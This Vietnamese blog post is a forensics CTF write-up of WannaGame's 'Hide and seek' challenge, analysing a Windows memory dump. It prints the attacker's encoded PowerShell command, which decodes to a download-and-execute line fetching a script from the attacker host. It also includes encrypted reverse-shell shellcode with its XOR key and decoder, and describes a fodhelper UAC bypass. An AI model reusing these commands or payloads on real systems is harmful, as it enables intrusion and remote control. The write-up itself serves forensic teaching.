---
title: "WannaGame - Hide and seek"
date: 2025-12-10 12:00:00 +0700
categories: [CTF, Digital Forensics]
tags: [forensics, disk-imaging, wanna-game]
image:
    path: /assets/img/posts/Hide_and_seek/banner.png

    alt: Hide and seek
---
## Giới thiệu
Đây là 1 thử thách forensics ctf đến từ WannaGame. Theo mình thì giải này khá là khó. 
## [1]. What id MITRE ID for initial access? (TXXXX.XXX)
Đầu tiên, mình sẽ kiểm tra browser log của nạn nhân
```
nqghuy@nqghuy ~/C/f/w/attachment> vol -f memdump.raw windows.filescan > filescan
nqghuy@nqghuy ~/C/f/w/attachment> cat filescan | grep -i "places.sqlite"
0x9676e590	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-shm
0x9676e668	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-shm
0x9676e8f0	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-wal
0x9676f160	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite
0x96774d58	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite
0x96777500	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-wal
0x967785e0	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-shm
0x9677a950	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite
0x9677bcb8	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-wal
0x9677c1c8	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-shm
0x96789668	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite
0x96789e00	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-wal
0x96789ed8	\Users\imnoob\AppData\Roaming\Mozilla\Firefox\Profiles\sndxvn6x.default-release\places.sqlite-shm
nqghuy@nqghuy ~/C/f/w/attachment> vol -f memdump.raw windows.dumpfiles.DumpFiles --virtaddr 0x9676f160
Volatility 3 Framework 2.26.2
Progress:  100.00		PDB scanning finished                        
Cache	FileObject	FileName	Result

DataSectionObject	0x9676f160	places.sqlite	Error dumping file
SharedCacheMap	0x9676f160	places.sqlite	file.0x9676f160.0x9626f060.SharedCacheMap.places.sqlite.vacb
nqghuy@nqghuy ~/C/f/w/attachment> sqlitebrowser file.0x9676f160.0x9626f060.SharedCacheMap.places.sqlite.vacb
```
Có vẻ nạn nhân đã bấm link lạ
![alt text](/assets/img/posts/Hide_and_seek/image.png)
Tra google hoặc hỏi chatgpt, ta được mitre Id là `T1566.002`
![alt text](/assets/img/posts/Hide_and_seek/image-1.png)

## [2]. What link did the victim access? (ASCII)
Từ ảnh trên -> `http://192.168.1.11:7331/captcha.html`

## [3]. What command does the attacker trick the victim into executing? (ASCII)
Chạy plugin cmdline
```
nqghuy@nqghuy ~/C/f/w/attachment> vol -f memdump.raw windows.cmdline > cmdline
```
![alt text](/assets/img/posts/Hide_and_seek/image-2.png)
Answer: powershell.exe -eC aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADoANwAzADMAMQAvAHkALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgA

## [4]. What link to run the script and what file name is it stored in?
Giải mã đoạn trên ta có :
|iwr http://192.168.1.11:7331/y.ps1 -UseBasicParsing | iex
ta có được link
Tiếp theo dump proc 3000
```
nqghuy@nqghuy ~/C/f/w/attachment> vol -f memdump.raw windows.memmap --dump --pid 3000 > pid.3000.dmp
```
![alt text](/assets/img/posts/Hide_and_seek/image-4.png)
nó tải update.zip rồi lưu vào kqwer.zip
-> `http://192.168.1.11:7331/y.ps1_kqwer.zip`

## [5]. What is the MITRE ID of this technique and where does this command store in the registry? (TXXXX_Hive\key)
Kẻ tấn công lừa nạn nhân thực thi shell
![alt text](/assets/img/posts/Hide_and_seek/image-5.png)
-> T1204
Sau đó mình kiểm tra registry key như Run và RunOnce như không thu được gì
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
Có vẻ như mình hiểu sai đề
Sau đó
![alt text](/assets/img/posts/Hide_and_seek/image-6.png)
Powershell là tiến trình con của explorer. Kiểm tra key `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` - Registry key lưu lịch sử các lệnh mà người dùng đã gõ trong hộp thoại Run (Win + R)

![alt text](/assets/img/posts/Hide_and_seek/image-7.png)

## [6]. What was the malicious file location and which process was invoked by this malware? Provide its PID?? (C:\path\folder\A_processA.ext_1234)
Tiến trình powershell có tiến trình verify khả nghi
```
nqghuy@nqghuy ~/C/f/w/attachment> cat filescan | grep -i "verify.exe"
0xb9f78070	\Users\imnoob\AppData\Local\Temp\file\verify.exe
nqghuy@nqghuy ~/C/f/w/attachment> vol -f memdump.raw windows.dumpfiles.DumpFiles --virtaddr 0xb9f78070
```
```
nqghuy@nqghuy ~/C/f/w/attachment> md5sum file.0xb9f78070.0xbe1e9de0.ImageSectionObject.verify.exe.img
c0f54cd03805f701c2550f1955944d45  file.0xb9f78070.0xbe1e9de0.ImageSectionObject.verify.exe.img
```

![alt text](/assets/img/posts/Hide_and_seek/image-8.png)
không liêm
```
nqghuy@nqghuy ~/C/f/w/attachment> cat filescan | grep -i "verify.exe"
0xb9f78070	\Users\imnoob\AppData\Local\Temp\file\verify.exe
```
vậy location là `C:\Users\imnoob\AppData\Local\Temp\file`. Câu này làm mình khá lú lẫn. Mình toàn thử `C:\Users\imnoob\AppData\Local\Temp\file\verify.exe`

![alt text](/assets/img/posts/Hide_and_seek/image-9.png)
ta có key là v10 = "6ddLG9a8gc69cf4J0bZrzgGjr9zRMR"
key được xor với v11 là dword_F20CC
![alt text](/assets/img/posts/Hide_and_seek/image-10.png)

Viết file decode đơn giản (từ gpt)
```
nqghuy@nqghuy ~/C/f/w/attachment> cat shellcode.py
from pathlib import Path

blob_hex = """
CA 8C EB 4C 47 39 01 09 B5 07 BD 6B  53 EF D1 C1 62 6E D1 20
6E 68 F0 20 54 08 85 D9  3F 7A 07 A4 C8 70 26 45
63 14 47 A2 F9 34 62 A1  7D 3F DF 30 D1 20 6A 30
CC 28 4E 38 AA D9 0D 2A  B3 A4 10 00 46 E9 EA 70
7F E8 6E 19 33 67 E7 CF  F9 16 66 43 85 2E CC 5E
F9 38 AC 63 8D FE F7 AB  69 4D 80 01 81 4D 93 60
4B C1 58 1B 10 3F D0 3A  D1 2A 5E 66 94 0C F9 35
31 D9 15 4E 37 B7 EF 48  CC 38 B1 B1 23 47 12 62
38 07 6D 10 61 9D BA 2A  25 3D CC 78 9B B9 85 AD
B2 0F 5E 57 56 4C 47 51  16 4B 55 3C 62 51 2F 11
12 4D B9 8A A5 A2 C2 F7  46 6A 72 10 BE 06 1D 3A
1F E4 0F 4C B8 EC 0B 32  0F A3 9E 38 68 0E 36 4A
CB C7 D3 94 2A 37 17 3A  32 69 3A 02 25 B8 39 BB
84 B3 92 AE 0B 28 31 34  5E A0 C6 12 55 B5 E5 E7
9A 06 70 98 09 62 07 D5  92 35 4D 52 36 0E 64 26
43 6F 36 50 65 BA FE 66  9C B3 B7 B2 30 1C 6C F9
4C 0D 07 02 72 29 7A 52  1B 38 36 0C 3C E8 14 DC
9E ED F4 30 5C 39 35 35  63 22 32 BB 92 2D 85 B2
C4 92 72 44 52 0A 25 52  76 64 64 26 47 69 09 33
48 6C 06 C6 B6 31 5C 3F  5E 2F 3B 8D AF 39 19 95
7E 1D 75 D7 3D AD C9 9B  8D D7 B8 C6 9E 39 A4 4A F0 4C A2 A5 8F BA 85 C0  0C 18 7A 34 B8 BF 00 01 01 01 00 00
"""

blob = bytes.fromhex(blob_hex)
print(len(blob))

key = b"6ddLG9a8gc69cf4J0bZrzgGjr9zRMR"
out = bytearray(355)

k = 0
for i in range(354):
    out[i] = blob[i] ^ key[k]
    k = (k + 1) % len(key)

Path("shellcode.bin").write_bytes(out)

print("Decrypted shellcode saved to shellcode.bin")
```
malware duyệt danh sách file exe -> explorer.exe
![alt text](/assets/img/posts/Hide_and_seek/image-11.png)

-> `C:\Users\imnoob\AppData\Local\Temp\file_explorer.exe_6500`
## [7]. What is IP and PORT of attacker in injected shellcode? (IP:PORT)
```
nqghuy@nqghuy ~/C/f/w/attachment> ndisasm -b 32 shellcode.bin
00000000  FC                cld
00000001  E88F0000AD        call 0xad000095
00000006  7231              jc 0x39
00000008  D2648B52          shl byte [ebx+ecx*4+0x52],cl
0000000C  3089E58B520C      xor [ecx+0xc528be5],cl
00000012  8B5214            mov edx,[edx+0x14]
00000015  0FB74A26          movzx ecx,word [edx+0x26]
00000019  31FF              xor edi,edi
0000001B  8B7228            mov esi,[edx+0x28]
0000001E  31C0              xor eax,eax
00000020  AC                lodsb
00000021  3C61              cmp al,0x61
...
```
decompile shellcode
![alt text](/assets/img/posts/Hide_and_seek/image-12.png)
chatgpt phân tích assembly ta được ip 192.168.1.11, port 64421; hoặc
sử dụng scdbg để phân tích động
```
PS C:\Users\huy\Downloads> .\scdbg.exe -f ..\Desktop\shellcode.bin -i                                                   Loaded 163 bytes from file ..\Desktop\shellcode.bin                                                                     Initialization Complete..                                                                                               Interactive Hooks enabled                                                                                               Max Steps: 2000000                                                                                                      Using base offset: 0x401000                                                                                                                                                                                                                     4010aa  LoadLibraryA(ws2_32)                                                                                            4010ba  WSAStartup(190)                                                                                                 4010d7  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)                                                                4010e3  connect(h=18c, host: 192.168.1.11 , port: 64421 ) = 71ab4a07  
```
## [8]. What process was used to bypass UAC and PPID? (ProcessA.ext_1234)
UAC = User Account Control, là cơ chế bảo mật của Windows dùng để ngăn chương trình tự ý chạy với quyền Administrator. Bypass UAC là kỹ thuật chạy code với admin
```
nqghuy@nqghuy ~/C/f/w/attachment> cat pid3000 | grep fodhelper.exe
fodhelper.exe
nqghuy@nqghuy ~/C/f/w/attachment> cat pstree | grep fodhelper
**** 2964	5888	fodhelper.exe	0xbc168040	0	-	1	False	2025-12-05 12:46:39.000000 UTC	2025-12-05 12:46:39.000000 UTC	\Device\HarddiskVolume2\Windows\System32\fodhelper.exe	-	-
nqghuy@nqghuy ~/C/f/w/attachment> cat pstree | grep 5888
*** 5888	6056	powershell.exe	0xbd845080	11	-	1	False	2025-12-05 12:45:52.000000 UTC	N/A	\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	powershell  -ExecutionPolicy Bypass	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
**** 2964	5888	fodhelper.exe	0xbc168040	0	-	1	False	2025-12-05 12:46:39.000000 UTC	2025-12-05 12:46:39.000000 UTC	\Device\HarddiskVolume2\Windows\System32\fodhelper.exe
```
Ta thấy pid 5888 sinh ra một process fodhelper.exe. Trong pid3000 cũng có fodhelper.exe. Mặt khác fodhelper.exe có property AUTO-ELEVATE = TRUE → nghĩa là nó luôn chạy với quyền Administrator mà không cần UAC prompt.
-> fodhelper.exe_5888

## Kết luận
Đối với mình bài này hơi khoai, đặc biệt là câu hỏi hơi lú lẫn. Qua bài này mình học được thêm khác nhiều như decompile shellcode hay kĩ thuật bypass UAC.
